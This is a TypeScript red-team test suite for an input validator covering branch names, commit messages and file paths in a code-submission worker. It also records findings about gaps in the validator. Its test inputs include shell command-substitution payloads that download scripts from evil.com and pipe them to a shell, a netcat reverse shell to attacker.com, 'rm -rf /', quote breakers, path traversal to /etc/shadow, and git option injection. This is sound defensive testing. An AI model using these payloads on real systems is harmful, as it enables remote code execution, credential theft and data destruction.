import { describe, it, expect } from "vitest";
import { validateSolution } from "../../src/solution-validator.js";
import type { SolutionValidationError } from "../../src/solution-validator.js";

// ---------------------------------------------------------------------------
// Brief 11: Red-team verification of the worker injection fix
// ---------------------------------------------------------------------------
// These tests verify that validateSolution rejects or sanitizes hostile
// inputs crafted to bypass path, branch, and commit restrictions.
//
// Per BRIEFS.md: do NOT fix production code; file findings instead.
// ---------------------------------------------------------------------------

describe("red-team: command substitution in branch/commit", () => {
  it.each([
    "`id`",
    "$(id)",
    "$(cat /etc/passwd)",
    "$(wget http://evil.com/shell.sh -O- | sh)",
    "$(curl http://evil.com/shell.sh | bash)",
    "`curl http://evil.com/shell.sh | bash`",
    "$(nc -e /bin/sh attacker.com 4444)",
    "${PATH}",
    "${IFS}$(id)",
    "`$(echo id)`",
  ])(
    "should reject branch name containing command substitution: %s",
    (branchName) => {
      const result = validateSolution(branchName, "test commit", []);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        // Branch name regex rejects non-alphanumeric chars; may also flag empty field
        expect(result.errors.length).toBeGreaterThanOrEqual(1);
      }
    }
  );

  it.each([
    "`id`",
    "$(id)",
    "$(cat /etc/passwd)",
    "$(rm -rf /)",
    "$(touch /tmp/pwned)",
  ])(
    "FINDING: does NOT reject commit message containing command substitution: %s",
    (commitMsg) => {
      // Finding: validateSolution only checks single-line + length for commit messages.
      // It does NOT detect shell metacharacters. Mitigated by hardened worker.sh
      // which uses double-quoted "${COMMIT_MESSAGE}" in all shell contexts.
      const result = validateSolution("safe-branch", commitMsg, [
        { path: "src/x.ts", content: "x", operation: "create" },
      ]);
      // Validator accepts these - this is a FINDING, documented here
      expect(result.valid).toBe(true);
    }
  );
});

describe("red-team: quote/heredoc breakers in branch/commit", () => {
  it.each([
    '"; rm -rf /',
    '"; rm -rf / #',
    "' ; rm -rf / ; '",
    `$(echo "evil");`,
    "$(echo evil)",
    `'$(id)'`,
  ])(
    "should reject branch name with quote/heredoc breaker: %s",
    (branchName) => {
      const result = validateSolution(branchName, "test commit", []);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors[0].field).toBe("branchName");
      }
    }
  );

  it.each([
    '"; rm -rf /',
    "' ; rm -rf / ; '",
    '$(echo "evil")',
  ])(
    "FINDING: does NOT reject commit message with quote breaker: %s",
    (commitMsg) => {
      // Finding: validateSolution only checks single-line + length for commit messages.
      // Quote characters pass validation. Mitigated by hardened worker.sh quoting.
      const result = validateSolution("safe-branch", commitMsg, [
        { path: "src/x.ts", content: "x", operation: "create" },
      ]);
      expect(result.valid).toBe(true);
    }
  );
});

describe("red-team: newline / CRLF / NUL injection", () => {
  it("should reject branch name with embedded newline", () => {
    const branchName = "fix/bad\n$(rm -rf /)";
    const result = validateSolution(branchName, "test commit", []);
    expect(result.valid).toBe(false);
  });

  it("should reject commit message with embedded newline", () => {
    const commitMsg = "first line\nsecond line $(id)";
    const result = validateSolution("safe-branch", commitMsg, []);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.errors.some((e) => e.field === "commitMessage")).toBe(true);
    }
  });

  it("should reject branch name with NUL byte", () => {
    const branchName = "fix/bad\x00$(id)";
    const result = validateSolution(branchName, "test commit", []);
    expect(result.valid).toBe(false);
  });

  it("should reject commit message with CRLF", () => {
    const commitMsg = "fix: change\r\n$(id)";
    const result = validateSolution("safe-branch", commitMsg, []);
    expect(result.valid).toBe(false);
  });
});

describe("red-team: path traversal attacks", () => {
  it.each([
    "../../etc/passwd",
    "../../../etc/shadow",
    "....//....//etc/passwd",
    "../.git/config",
    "foo/../../../etc/hostname",
  ])(
    "should reject file path with traversal: %s",
    (path) => {
      const result = validateSolution("safe-branch", "safe commit", [
        { path, content: "evil", operation: "create" },
      ]);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors.some((e) => e.field === "path")).toBe(true);
      }
    }
  );

  it("should normalize ./././etc/passwd → etc/passwd (no traversal after normalization)", () => {
    // Finding: ./././etc/passwd normalizes to etc/passwd, passing validation.
    // This is NOT a vulnerability since etc/passwd is a valid relative path,
    // but confirms that normalization happens BEFORE traversal check.
    const result = validateSolution("safe-branch", "safe commit", [
      { path: "./././etc/passwd", content: "evil", operation: "create" },
    ]);
    expect(result.valid).toBe(true);
  });

  it("should reject path with double slashes", () => {
    const result = validateSolution("safe-branch", "safe commit", [
      { path: "foo//bar", content: "x", operation: "create" },
    ]);
    expect(result.valid).toBe(false);
  });
});

describe("red-team: dangerous file targets", () => {
  it.each([
    ".github/workflows/evil.yml",
    ".env",
    ".env.production",
    ".env.staging",
    "keys/id_rsa",
    "keys/id_rsa.pub",
    "src/.git/hooks/pre-commit",
    ".git/refs/heads/main",
    ".git/config",
    ".git/HEAD",
    ".lock",
    "foo.lock",
  ])(
    "should reject file path matching denied patterns: %s",
    (path) => {
      const result = validateSolution("safe-branch", "safe commit", [
        { path, content: "x", operation: "create" },
      ]);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors.some((e) => e.field === "path")).toBe(true);
      }
    }
  );

  it("should reject absolute paths", () => {
    const result = validateSolution("safe-branch", "safe commit", [
      { path: "/etc/passwd", content: "root:x:0:0", operation: "create" },
    ]);
    expect(result.valid).toBe(false);
  });

  it("should reject paths ending with slash", () => {
    const result = validateSolution("safe-branch", "safe commit", [
      { path: "dir/", content: "x", operation: "create" },
    ]);
    expect(result.valid).toBe(false);
  });
});

describe("red-team: option injection in branch name", () => {
  it.each([
    "--upload-pack=evil",
    "-f",
    "--force",
  ])(
    "should reject branch name starting with option flag: %s",
    (branchName) => {
      const result = validateSolution(branchName, "safe commit", []);
      expect(result.valid).toBe(false);
    }
  );

  it.each([
    "a$(id)b",
    "a`id`b",
    "a$(cat /etc/passwd)b",
    "a;b;id",
    "a|id|",
    "a&&id&&",
    "a||id||",
  ])(
    "should reject branch name with inline shell metacharacters: %s",
    (branchName) => {
      const result = validateSolution(branchName, "safe commit", []);
      expect(result.valid).toBe(false);
    }
  );
});

describe("red-team: unicode and confusables", () => {
  it("should reject branch name with RTL override characters", () => {
    const rtl = "\u202E";
    const branchName = `fix/${rtl}evil`;
    const result = validateSolution(branchName, "safe commit", []);
    // The branch regex should catch non-ASCII
    expect(result.valid).toBe(false);
  });

  it("should reject branch name with homoglyph numbers", () => {
    // Fullwidth digits (０１２)
    const branchName = "ｆix／０ne";
    const result = validateSolution(branchName, "safe commit", []);
    // Non-ASCII should fail the regex
    expect(result.valid).toBe(false);
  });
});

describe("red-team: large content attacks", () => {
  it("should reject solution exceeding max files", () => {
    const files = Array.from({ length: 25 }, (_, i) => ({
      path: `src/file-${i}.ts`,
      content: "x",
      operation: "create" as const,
    }));
    const result = validateSolution("safe-branch", "safe commit", files);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.errors.some((e) => e.reason.includes("max"))).toBe(true);
    }
  });

  it("should reject solution exceeding max bytes", () => {
    const bigContent = "x".repeat(1_100_000);
    const result = validateSolution("safe-branch", "safe commit", [
      { path: "src/big.ts", content: bigContent, operation: "create" },
    ]);
    expect(result.valid).toBe(false);
  });
});

describe("red-team: duplicate paths", () => {
  it("should reject duplicate file paths", () => {
    const result = validateSolution("safe-branch", "safe commit", [
      { path: "src/foo.ts", content: "a", operation: "create" },
      { path: "src/foo.ts", content: "b", operation: "update" },
    ]);
    expect(result.valid).toBe(false);
  });
});

describe("red-team: empty inputs", () => {
  it("should reject empty branch name", () => {
    const result = validateSolution("", "safe commit", [
      { path: "src/foo.ts", content: "a", operation: "create" },
    ]);
    expect(result.valid).toBe(false);
  });

  it("should reject empty commit message", () => {
    const result = validateSolution("safe-branch", "", [
      { path: "src/foo.ts", content: "a", operation: "create" },
    ]);
    expect(result.valid).toBe(false);
  });

  it("should reject empty files array", () => {
    const result = validateSolution("safe-branch", "safe commit", []);
    expect(result.valid).toBe(false);
  });
});

describe("red-team: sanitize paths for valid inputs", () => {
  it.each([
    "./src/foo.ts",
    "././src/foo.ts",
  ])(
    "should normalize path and accept valid input: %s",
    (rawPath) => {
      const result = validateSolution("safe-branch", "safe commit", [
        { path: rawPath, content: "console.log('hi');", operation: "create" },
      ]);
      expect(result.valid).toBe(true);
    }
  );

  it("should reject absolute paths as a security finding", () => {
    const result = validateSolution("safe-branch", "safe commit", [
      { path: "/src/foo.ts", content: "console.log('hi');", operation: "create" },
    ]);
    // This is a deliberate finding: absolute paths are rejected
    expect(result.valid).toBe(false);
  });

  it.each([
    "fix/add-rate-limiting",
    "fix/issue-123-add-rate-limiting",
    "feature/auth-flow",
    "bugfix/123-fix-typo",
    "chore/update-deps",
  ])(
    "should accept valid branch name: %s",
    (branchName) => {
      const result = validateSolution(branchName, "chore: update dependencies", [
        { path: "src/foo.ts", content: "export const x = 1;", operation: "create" },
      ]);
      expect(result.valid).toBe(true);
    }
  );

  it.each([
    "fix: add rate limiting",
    "chore: update package.json",
    "feat: implement auth flow",
    "bugfix: fix null pointer in parser",
  ])(
    "should accept valid commit message: %s",
    (commitMsg) => {
      const result = validateSolution("safe-branch", commitMsg, [
        { path: "src/foo.ts", content: "export const x = 1;", operation: "create" },
      ]);
      expect(result.valid).toBe(true);
    }
  );
});
